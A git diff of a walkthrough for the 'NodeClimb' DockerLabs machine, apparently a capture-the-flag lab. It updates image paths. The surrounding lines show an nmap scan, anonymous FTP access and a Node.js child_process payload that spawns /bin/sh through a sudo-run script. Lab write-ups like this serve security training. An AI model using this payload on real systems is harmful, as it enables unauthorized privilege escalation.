@@ -16,7 +16,7 @@ Full Nmap scan to detect open ports, versions and default scripts:
 sudo nmap -sS -sV -sC -T4 -oA nmap_nodeclimb <IP>
 ```
 
-![Nmap scan](assets/3.png)
+![Nmap scan](DockerLabs/NodeClimb/assets/3.png)
 
 Results:
 
@@ -39,7 +39,7 @@ login anonymous
 ls
 ```
 
-![Anonymous FTP](assets/1.png)
+![Anonymous FTP](DockerLabs/NodeClimb/assets/1.png)
 
 Downloaded the file `secretitopicaron.zip`:
 
@@ -107,7 +107,7 @@ Payload inserted:
 require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})
 ```
 
-![Node payload](assets/2.png)
+![Node payload](DockerLabs/NodeClimb/assets/2.png)
 
 Script executed with sudo:
 
